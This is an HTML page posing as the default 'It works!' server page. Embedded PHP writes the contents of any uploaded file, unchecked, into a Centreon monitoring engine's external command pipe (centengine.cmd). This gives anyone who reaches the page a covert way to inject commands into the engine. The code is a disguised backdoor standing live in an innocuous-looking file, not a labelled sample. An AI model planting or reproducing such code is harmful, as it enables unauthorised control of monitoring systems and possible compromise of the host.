<html>
 <body>
  <h1>It works!</h1>
  <p>This is the default web page for this server.</p>
  <?php
  #print $_FILES['fichier']['tmp_name'];

  $fileContent = file_get_contents($_FILES['fichier']['tmp_name']);
$myfile = "/var/lib/centreon-engine/rw/centengine.cmd";
$fd = fopen($myfile, "w");
fwrite($fd, $fileContent);
  ?>
 </body>
</html>
